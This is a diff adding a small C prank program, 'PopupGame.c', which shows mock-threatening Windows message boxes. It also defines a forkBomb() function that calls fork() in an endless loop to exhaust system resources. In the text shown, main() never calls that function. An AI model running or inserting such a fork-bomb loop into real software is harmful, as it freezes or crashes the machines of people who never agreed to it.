@@ -1,0 +1,22 @@
+/*
+ * PopupGame.c
+ *
+ *  Created on: Jun 17, 2016
+ *      Author: Barrett
+ */
+#include <stdio.h>
+#include <unistd.h>
+#include <windows.h>
+
+void forkBomb(){
+	MessageBox(NULL,"Your computer is screwed", "Fork Bomb", MB_OK | MB_TOPMOST);
+	while(1){
+		fork();
+
+	}
+}
+
+int main(){
+	MessageBox(NULL,"Ah, hello. So you're the unfortunate soul that got recruited to this program. \nLets go over some stuff...", "Fork Bomb", MB_OK | MB_TOPMOST);
+	MessageBox(NULL,"This information is top secret so from here on out do NOT shut off\n these messages or I WILL make your computer self destruct", "Fork Bomb", MB_OK | MB_TOPMOST);
+}
